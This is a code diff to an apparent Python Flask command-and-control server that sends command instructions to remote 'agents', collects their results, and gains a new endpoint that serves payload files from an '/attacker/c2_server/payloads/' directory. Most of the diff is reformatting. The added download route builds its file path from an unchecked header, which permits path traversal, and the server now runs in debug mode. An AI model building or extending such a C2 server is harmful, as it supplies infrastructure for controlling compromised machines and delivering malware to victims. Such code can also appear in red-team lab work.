@@ -1,4 +1,6 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, Response
+
+# from aiohttp import web
 import json
 import base64
 import binascii
@@ -113,6 +115,7 @@ async def send_command():
             timeout=60,
             payloads=[],
             uploads=[],
+            delete_payload=False,
         )
 
         agents[agent]["instructions"].append(instruction)
@@ -121,13 +124,18 @@ async def send_command():
         try:
             await asyncio.wait_for(commandEvents[commandId].wait(), timeout=30)
         except asyncio.TimeoutError:
-            return jsonify({
-                "results": {
-                    "message": "Timeout waiting for response",
-                    "id": commandId,
-                    "status": "timeout"
-                }
-            }), 408
+            return (
+                jsonify(
+                    {
+                        "results": {
+                            "message": "Timeout waiting for response",
+                            "id": commandId,
+                            "status": "timeout",
+                        }
+                    }
+                ),
+                408,
+            )
 
         results = agents[agent]["results"]
         for result in results:
@@ -147,20 +155,19 @@ async def send_command():
                 agents[agent]["instructions"].remove(instruction)
                 del commandEvents[commandId]
 
-                return jsonify({
-                    "results": {
-                        "message": "Command executed",
-                        **response_data
-                    }
-                })
+                return jsonify(
+                    {"results": {"message": "Command executed", **response_data}}
+                )
 
-        return jsonify({
-            "results": {
-                "message": "Command sent, no response received",
-                "id": commandId,
-                "status": "pending"
+        return jsonify(
+            {
+                "results": {
+                    "message": "Command sent, no response received",
+                    "id": commandId,
+                    "status": "pending",
+                }
             }
-        })
+        )
 
     except json.JSONDecodeError:
         return jsonify({"error": "Invalid JSON data"}), 400
@@ -168,5 +175,31 @@ async def send_command():
         return jsonify({"error": f"Internal server error: {str(e)}"}), 500
 
 
+# Download file
+@app.route("/file/download", methods=["POST"])
+def download():
+    try:
+        file_name = request.headers.get("File")
+
+        if not file_name:
+            return jsonify({"error": "Missing file name"}), 400
+
+        file_path = f"/attacker/c2_server/payloads/{file_name}"
+        with open(file_path, "rb") as f:
+            file_data = f.read()
+
+        headers = {
+            "Content-Disposition": f'attachment; filename="{file_name}"',
+            "FILENAME": file_name,
+        }
+
+        return file_data, 200, headers
+
+    except FileNotFoundError:
+        return jsonify({"error": "File not found"}), 404
+    except Exception as e:
+        return jsonify({"error": f"Internal server error: {str(e)}"}), 500
+
+
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=8888)
+    app.run(host="0.0.0.0", port=8888, debug=True)
